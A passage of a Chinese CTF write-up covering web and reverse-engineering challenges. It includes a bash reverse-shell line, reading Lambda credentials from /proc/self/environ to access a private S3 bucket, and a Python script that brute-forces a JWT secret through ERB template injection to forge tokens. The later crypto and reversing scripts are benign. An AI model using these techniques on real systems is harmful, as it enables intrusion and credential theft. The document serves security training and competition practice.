=&gt; &#123;</span><br><span class="line">&gt;             cp.exec(`rm -rf /tmp/$&#123;field_name&#125;`, () =&gt; &#123;</span><br><span class="line">&gt;                 rej(e);</span><br><span class="line">&gt;             &#125;);</span><br><span class="line">&gt;         &#125;);</span><br><span class="line">&gt;     &#125;);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; const s3Parme = &#123;</span><br><span class="line">&gt;     // accessKeyId:&quot;xxxxxxxxxxxxxxxx&quot;,</span><br><span class="line">&gt;     // secretAccessKey:&quot;xxxxxxxxxxxxxxxxxxx&quot;,</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; var s3 = new AWS.S3(s3Parme);</span><br><span class="line">&gt; const app = new koa();</span><br><span class="line">&gt; const router = new Router();</span><br><span class="line">&gt; app.use(bodyparser());</span><br><span class="line">&gt; app.use(mount(&apos;/static&apos;,require(&apos;koa-static&apos;)(require(&apos;path&apos;).join(__dirname,&apos;./static&apos;))));</span><br><span class="line">&gt; router.get(&quot;/&quot;, async (ctx) =&gt; &#123;</span><br><span class="line">&gt;     return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">&gt;         fs.readFile(require(&apos;path&apos;).join(__dirname, &apos;./static/index.html&apos;), (err, data) =&gt; &#123;</span><br><span class="line">&gt;             if (err) &#123;</span><br><span class="line">&gt;                 ctx.throw(&quot;系统发生错误,请重试&quot;);</span><br><span class="line">&gt;                 return;</span><br><span class="line">&gt;             &#125;;</span><br><span class="line">&gt;             ctx.type = &apos;text/html&apos;;</span><br><span class="line">&gt;             ctx.body = data.toString();</span><br><span class="line">&gt;             resolve();</span><br><span class="line">&gt;         &#125;);</span><br><span class="line">&gt;     &#125;);</span><br><span class="line">&gt; &#125;)</span><br><span class="line">&gt; .post(&quot;/login&quot;,async(ctx)=&gt;&#123;</span><br><span class="line">&gt;     if(!ctx.request.body.email || !ctx.request.body.password)&#123;</span><br><span class="line">&gt;         ctx.throw(400,&quot;参数错误&quot;);</span><br><span class="line">&gt;         return;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     ctx.body = &#123;isUser:false,message:&quot;用户名或密码错误&quot;&#125;;</span><br><span class="line">&gt;     return;</span><br><span class="line">&gt; &#125;)</span><br><span class="line">&gt; .post(&quot;/upload&quot;, async (ctx) =&gt; &#123;</span><br><span class="line">&gt;     const parme = ctx.request.body;</span><br><span class="line">&gt;     const nodeModules = parme.npm;</span><br><span class="line">&gt;     const key = parme.key;</span><br><span class="line">&gt;     if(typeof key == &quot;undefined&quot; || key!=&quot;abcdefghiklmn123&quot;)&#123;</span><br><span class="line">&gt;         ctx.throw(403,&quot;请求失败&quot;);</span><br><span class="line">&gt;         return;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     if (typeof nodeModules == &quot;undefined&quot;) &#123;</span><br><span class="line">&gt;         ctx.throw(400, &quot;JSON 格式错误&quot;);</span><br><span class="line">&gt;         return;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     const zipFileName = `$&#123;getRandomStr(20)&#125;.zip`;</span><br><span class="line">&gt;     var output = fs.createWriteStream(`/tmp/$&#123;zipFileName&#125;`, &#123; flags: &quot;w&quot; &#125;);</span><br><span class="line">&gt;     var archive = archiver(&apos;zip&apos;, &#123;</span><br><span class="line">&gt;         zlib: &#123; level: 9 &#125;,</span><br><span class="line">&gt;     &#125;);</span><br><span class="line">&gt;     try &#123;</span><br><span class="line">&gt;         await zip(archive, output, nodeModules);</span><br><span class="line">&gt;     &#125; catch (e) &#123;</span><br><span class="line">&gt;         console.log(e);</span><br><span class="line">&gt;         ctx.throw(400,&quot;系统发生错误,请重试&quot;);</span><br><span class="line">&gt;         return;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     const zipBuffer = fs.readFileSync(`/tmp/$&#123;zipFileName&#125;`);</span><br><span class="line">&gt;     const data = await s3.upload(&#123; Bucket: cfg.Bucket, Key: `node_modules/$&#123;zipFileName&#125;`, Body: zipBuffer ,ACL:&quot;public-read&quot;&#125;).promise().catch(e=&gt;&#123;</span><br><span class="line">&gt;         console.log(e);</span><br><span class="line">&gt;         ctx.throw(400,&quot;系统发生错误,请重试&quot;);</span><br><span class="line">&gt;         return;</span><br><span class="line">&gt;     &#125;);</span><br><span class="line">&gt;     ctx.body = &#123;url:`http://$&#123;cfg.host&#125;/node_modules/$&#123;zipFileName&#125;`&#125;;</span><br><span class="line">&gt;     cp.execSync(`rm -f /tmp/$&#123;zipFileName&#125;`);</span><br><span class="line">&gt;     return;</span><br><span class="line">&gt; &#125;)</span><br><span class="line">&gt; app.use(router.routes());</span><br><span class="line">&gt; </span><br><span class="line">&gt; if (process.env &amp;&amp; process.env.AWS_REGION) &#123;</span><br><span class="line">&gt;     require(&quot;dns&quot;).setServers([&apos;8.8.8.8&apos;,&apos;8.8.4.4&apos;]);</span><br><span class="line">&gt; const serverless = require(&apos;serverless-http&apos;);</span><br><span class="line">&gt; module.exports.handler = serverless(app, &#123;</span><br><span class="line">&gt; binary: [&apos;image/*&apos;, &apos;image/png&apos;, &apos;image/jpeg&apos;]</span><br><span class="line">&gt; &#125;);</span><br><span class="line">&gt; &#125;else&#123;</span><br><span class="line">&gt;     app.listen(3000,()=&gt;&#123;</span><br><span class="line">&gt;         console.log(`listening 3000......`);</span><br><span class="line">&gt;     &#125;);</span><br><span class="line">&gt; &#125;N</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>后端接受参数后打包zip，然后传到了AWS s3里</p><p>因为服务器中啥也没找到，故猜测flag不在web服务器里，在static.l0ca1.xyz里，</p><p>也就是AWS s3里，那就要获取 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; const s3Parme = &#123;</span><br><span class="line">&gt;     // accessKeyId:&quot;xxxxxxxxxxxxxxxx&quot;,</span><br><span class="line">&gt;     // secretAccessKey:&quot;xxxxxxxxxxxxxxxxxxx&quot;,</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>记得AWS内网有地方可以看这个key</p><p>https://www.freebuf.com/articles/web/135313.html http://www.52bug.cn/hkjs/5749.html https://n0j.github.io/2017/10/02/aws-s3-ctf.html https://www.jianshu.com/p/d34bbfc951fa https://www.freebuf.com/articles/system/129667.html</p><p>/var/task/.git/</p><figure><img src="https://p5.ssl.qhimg.com/t01a4928d1136297901.png" alt><figcaption>image.png</figcaption></figure><figure><img src="https://p0.ssl.qhimg.com/t01c151cb0ccf8c5165.png" alt><figcaption>img.png</figcaption></figure><p>反弹shell bash -i &gt;&amp; /dev/tcp//6666 0&gt;&amp; 几秒钟就会断开，但是时间够了</p><p>接着服务器上 node -e运行js，带着凭据直接访问s3，类似ssrf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; const AWS = require(&quot;aws-sdk&quot;);</span><br><span class="line">&gt; const s3 = new AWS.S3();</span><br><span class="line">&gt; const bkt = s3.listObjects(&#123;Bucket: &quot;static.l0ca1.xyz&quot;&#125;);</span><br><span class="line">&gt; bkt.promise().then((data)=&gt;&#123;</span><br><span class="line">&gt;         console.log(data)</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt;     );</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><figure><img src="https://p3.ssl.qhimg.com/t01fecf5dab7252a6c2.png" alt><figcaption>image.png</figcaption></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; const AWS = require(&quot;aws-sdk&quot;);</span><br><span class="line">&gt; const s3 = new AWS.S3();</span><br><span class="line">&gt; const flag = s3.getObject(&#123;Bucket: &quot;static.l0ca1.xyz&quot;, Key: &quot;flaaaaaaaaag/flaaaag.txt&quot;&#125;);</span><br><span class="line">&gt; flag.promise().then((data)=&gt;&#123;</span><br><span class="line">&gt;     console.log(data)</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; );</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><figure><img src="https://p0.ssl.qhimg.com/t010f5ff464272de78c.png" alt><figcaption>image.png</figcaption></figure><figure><img src="https://p3.ssl.qhimg.com/t01fca1ef37a2cf56fe.png" alt><figcaption>image.png</figcaption></figure><p>方法2：</p><p>https://www.freebuf.com/articles/network/189688.html</p><p>当一个AWS Lambda函数执行时，它会使用一个由开发者（IAM角色）提供的临时安全证书。此时需要从AWS STS（安全令牌服务）接收以下三个参数：</p><p>access key id</p><p>secret access key</p><p>token</p><p>这时候就能直接读取self/environ获得这三个东西，然后本地起开aws cli配置好key直接读s3就行了</p></blockquote><h2><span id="flag-shop">flag shop</span></h2><blockquote><p>robots.txt提示/filebak，访问后拿到源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&gt; require &apos;sinatra&apos;</span><br><span class="line">&gt; require &apos;sinatra/cookies&apos;</span><br><span class="line">&gt; require &apos;sinatra/json&apos;</span><br><span class="line">&gt; require &apos;jwt&apos;</span><br><span class="line">&gt; require &apos;securerandom&apos;</span><br><span class="line">&gt; require &apos;erb&apos;</span><br><span class="line">&gt; </span><br><span class="line">&gt; set :public_folder, File.dirname(__FILE__) + &apos;/static&apos;</span><br><span class="line">&gt; </span><br><span class="line">&gt; FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">&gt; #ENV[&quot;SECRET&quot;] = SecureRandom.hex(xx)</span><br><span class="line">&gt; </span><br><span class="line">&gt; configure do</span><br><span class="line">&gt;  enable :logging</span><br><span class="line">&gt;  file = File.new(File.dirname(__FILE__) + &apos;/../log/http.log&apos;,&quot;a+&quot;)</span><br><span class="line">&gt;  file.sync = true</span><br><span class="line">&gt;  use Rack::CommonLogger, file</span><br><span class="line">&gt; end</span><br><span class="line">&gt; </span><br><span class="line">&gt; get &quot;/&quot; do</span><br><span class="line">&gt;  redirect &apos;/shop&apos;, 302</span><br><span class="line">&gt; end</span><br><span class="line">&gt; </span><br><span class="line">&gt; get &quot;/filebak&quot; do</span><br><span class="line">&gt;  content_type :text</span><br><span class="line">&gt;  erb IO.binread __FILE__</span><br><span class="line">&gt; end</span><br><span class="line">&gt; </span><br><span class="line">&gt; get &quot;/api/auth&quot; do</span><br><span class="line">&gt;  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">&gt;  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &apos;HS256&apos;</span><br><span class="line">&gt;  cookies[:auth] = auth</span><br><span class="line">&gt; end</span><br><span class="line">&gt; </span><br><span class="line">&gt; get &quot;/api/info&quot; do</span><br><span class="line">&gt;  islogin</span><br><span class="line">&gt;  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &apos;HS256&apos; &#125;</span><br><span class="line">&gt;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">&gt; end</span><br><span class="line">&gt; </span><br><span class="line">&gt; get &quot;/shop&quot; do</span><br><span class="line">&gt;  erb :shop</span><br><span class="line">&gt; end</span><br><span class="line">&gt; </span><br><span class="line">&gt; get &quot;/work&quot; do</span><br><span class="line">&gt;  islogin</span><br><span class="line">&gt;  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &apos;HS256&apos; &#125;</span><br><span class="line">&gt;  auth = auth[0]</span><br><span class="line">&gt;  unless params[:SECRET].nil?</span><br><span class="line">&gt;    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">&gt;      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">&gt;    end</span><br><span class="line">&gt;  end</span><br><span class="line">&gt; </span><br><span class="line">&gt;  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line">&gt; </span><br><span class="line">&gt;    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">&gt;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &apos;HS256&apos;</span><br><span class="line">&gt;    cookies[:auth] = auth</span><br><span class="line">&gt;    ERB::new(&quot;&lt;script&gt;alert(&apos;#&#123;params[:name][0,7]&#125; working successfully!&apos;)&lt;/script&gt;&quot;).result</span><br><span class="line">&gt; </span><br><span class="line">&gt;  end</span><br><span class="line">&gt; end</span><br><span class="line">&gt; </span><br><span class="line">&gt; post &quot;/shop&quot; do</span><br><span class="line">&gt;  islogin</span><br><span class="line">&gt;  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &apos;HS256&apos; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line">&gt; </span><br><span class="line">&gt;    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">&gt;  else</span><br><span class="line">&gt; </span><br><span class="line">&gt;    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">&gt;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &apos;HS256&apos;</span><br><span class="line">&gt;    cookies[:auth] = auth</span><br><span class="line">&gt;    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">&gt;  end</span><br><span class="line">&gt; end</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; def islogin</span><br><span class="line">&gt;  if cookies[:auth].nil? then</span><br><span class="line">&gt;    redirect to(&apos;/shop&apos;)</span><br><span class="line">&gt;  end</span><br><span class="line">&gt; end</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>发现 <code>ERB::new("&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;").result</code></p><p>存在erb模版注入，构造<code>name为&lt;%=$~%&gt;，do为&lt;%=$~%&gt; is working</code></p><p>结合<code>ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")</code>，</p><p>SECRET参数可控，如果匹配到SECRET，则<code>$~</code> (ruby特性，表示最近一次正则匹配结果) 会在页面中返回</p><p>于是可以爆破secret，然后伪造JWT去买flag。</p><p>爆破脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt; import requests</span><br><span class="line">&gt; import base64</span><br><span class="line">&gt; </span><br><span class="line">&gt; url = &quot;http://47.110.15.101&quot;</span><br><span class="line">&gt; re = requests.session()</span><br><span class="line">&gt; re.get(url + &quot;/api/auth&quot;)</span><br><span class="line">&gt; </span><br><span class="line">&gt; flag = &quot;09810e652ce9fa4882fe4875c&quot;</span><br><span class="line">&gt; while True:</span><br><span class="line">&gt;    i = &quot;&quot;</span><br><span class="line">&gt;    for i in &quot;0123456789abcdef&quot;:</span><br><span class="line">&gt;        #now = flag + i</span><br><span class="line">&gt;        now = i + flag</span><br><span class="line">&gt;        res = re.get(url + &quot;/work?name=%3c%25%3d%24%7e%25%3e&amp;do=%3c%25%3d%24%7e%25%3e%20is%20working&amp;SECRET=&quot;+now)</span><br><span class="line">&gt;        if len(res.text) &gt; 48:</span><br><span class="line">&gt;            print res.text</span><br><span class="line">&gt;            print flag</span><br><span class="line">&gt;            flag = now</span><br><span class="line">&gt;            break</span><br><span class="line">&gt; print flag</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><figure><img src="https://p4.ssl.qhimg.com/t0144aa706bb5fd8b09.png" alt><figcaption>image.png</figcaption></figure><figure><img src="https://p1.ssl.qhimg.com/t0144c083e163191338.png" alt><figcaption>image.png</figcaption></figure></blockquote><h1><span id="re">Re</span></h1><h2><span id="who-is-he">Who is he</span></h2><blockquote><p>基于unity开发的游戏，实际只有一个视频播放器，输入框和一个确认框。</p><p>找了下资料，默认&lt;Game&gt;_data-CSharp.dll应该是存放主逻辑的地方。dnspy一把梭。</p><p>只是一个DES CBC模式的加密，密文密钥都有，初始iv和key相同。注意C#里面字符串默认是Unicode，密钥是”1234“，每个字符后面都要加""。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">import</span> base64</span><br><span class="line">&gt; <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">&gt; key = <span class="string">b"1\x002\x003\x004\x00"</span></span><br><span class="line">&gt; des = DES.new(key, mode = DES.MODE_CBC, iv = key)</span><br><span class="line">&gt; cipher = <span class="string">b"1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA=="</span></span><br><span class="line">&gt; cipher = base64.b64decode(cipher)</span><br><span class="line">&gt; plain = des.decrypt(cipher)[<span class="number">0</span>:<span class="number">-8</span>].decode(<span class="string">"utf-16"</span>)</span><br><span class="line">&gt; print(plain)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>解出来得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; He_P1ay_Basketball_Very_We11!Hahahahaha!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>交一下发现不对，找了半天好像这个dll里没什么奇怪的地方了。</p><p>后面用ce，直接暴力搜索"Emmmmm"</p><figure><img src="https://p5.ssl.qhimg.com/t01ccf147ae27749bdd.png" alt><figcaption>image.png</figcaption></figure><p>搜到不止一个结果，在内存中查看一下有新的收获，这里base64的部分和之前dll里的不一样！一共有两个地方不同，先尝试直接解密。第一个得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Oh no!This is a trick!!!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>第二个不知base64改了，key也改成了test。</p><p>解密之后得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; She_P1ay_Black_Hole_Very_Wel1!LOL!XD!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>提交正确。脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">import</span> base64</span><br><span class="line">&gt; <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">&gt; key = <span class="string">b"t\x00e\x00s\x00t\x00"</span></span><br><span class="line">&gt; <span class="comment"># print(a)</span></span><br><span class="line">&gt; <span class="comment"># print(key)</span></span><br><span class="line">&gt; des = DES.new(key, mode = DES.MODE_CBC, iv = key)</span><br><span class="line">&gt; a = <span class="string">b"xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU="</span></span><br><span class="line">&gt; a = base64.b64decode(a)</span><br><span class="line">&gt; res = des.decrypt(a)[<span class="number">0</span>:<span class="number">-6</span>].decode(<span class="string">"utf-16"</span>)</span><br><span class="line">&gt; print(res)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>继续在ce的内存中翻找，可以看到pe头。把整个dll dump下来，再丢尽dnspy，可以看到内容基本一致。</p></blockquote><h2><span id="creakme">Creakme</span></h2><blockquote><p>main开头第一个函数进行SMC。先查找区段.SCTF，然后调用DebugBreak下断点。猜测是通过调试器附加的方式来修改。之后进入<code>sub_402450</code>进行SMC。</p><p>很容易写个脚本还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">from</span> ida_bytes <span class="keyword">import</span> get_bytes, patch_bytes</span><br><span class="line">&gt; st = <span class="number">0x404000</span></span><br><span class="line">&gt; key = map(ord,list(<span class="string">"sycloversyclover"</span>))</span><br><span class="line">&gt; <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">&gt;     tmp = ord(get_bytes(st,<span class="number">1</span>))</span><br><span class="line">&gt;     tmp^=key[i%<span class="number">16</span>]</span><br><span class="line">&gt;     tmp = ~tmp</span><br><span class="line">&gt;     patch_bytes(st,chr(tmp))</span><br><span class="line">&gt;     st+=<span class="number">1</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>修改的函数<code>sub_404000</code>在接下来的<code>sub_4024A0</code>中被调用到，可以发现它将之后的一串字符串修改为base64字符串</p><p>后面加密部分，很容易看出AES CBC，密文密钥初始向量都有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">&gt; <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">&gt; key = <span class="string">b"sycloversyclover"</span></span><br><span class="line">&gt; iv = <span class="string">b"sctfsctfsctfsctf"</span></span><br><span class="line">&gt; aes = AES.new(key, mode = AES.MODE_CBC, iv = iv)</span><br><span class="line">&gt; res = <span class="string">b"nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo="</span></span><br><span class="line">&gt; cipher = b64decode(res)</span><br><span class="line">&gt; tmp = aes.decrypt(cipher)</span><br><span class="line">&gt; print(tmp)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>得到flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; sctf&#123;Ae3_C8c_I28_pKcs79ad4&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h2><span id="babyre">babyre</span></h2></blockquote><blockquote><p>有几个简单的花指令。</p><p>主逻辑很清晰，三部分password。</p><p>第一部分为5*5*5的迷宫，wasd上下左右，xy在z轴方向上下移动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; *****  *..**  *..**  *****  *****</span><br><span class="line">&gt; *****  ****.  *..**  *****  **..*</span><br><span class="line">&gt; ****.  ****.  ..#*.  *****  *...*</span><br><span class="line">&gt; ****.  *****  .***.  *****  ..*.*</span><br><span class="line">&gt; **s..  *****  .***.  .**..  .**.*</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>直接看出路径来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ddwwxxssxaxwwaasasyywwdd</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>第二部分就是base64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; c2N0Zl85MTAy</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>第三部分为一个简单的对称加密，直接逆回来:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"string.h"</span></span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> ROL(x, r)  (((x) <span class="meta-string">&lt;&lt; (r)) | ((x) &gt;&gt; (32 - (r))))</span></span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> ROR(x, r)  (((x) &gt;&gt; (r)) | ((x) &lt;&lt; (32 - (r))))</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">unsigned</span> <span class="keyword">int</span> a[<span class="number">288</span>] = &#123;<span class="number">0x0D6</span>, <span class="number">0x90</span>, <span class="number">0x0E9</span>, <span class="number">0x0FE</span>, <span class="number">0x0CC</span>, <span class="number">0x0E1</span>, <span class="number">0x3D</span>, <span class="number">0x0B7</span>, <span class="number">0x16</span>, <span class="number">0x0B6</span>, <span class="number">0x14</span>, <span class="number">0x0C2</span>, <span class="number">0x28</span>, <span class="number">0x0FB</span>, <span class="number">0x2C</span>, <span class="number">0x5</span>, <span class="number">0x2B</span>, <span 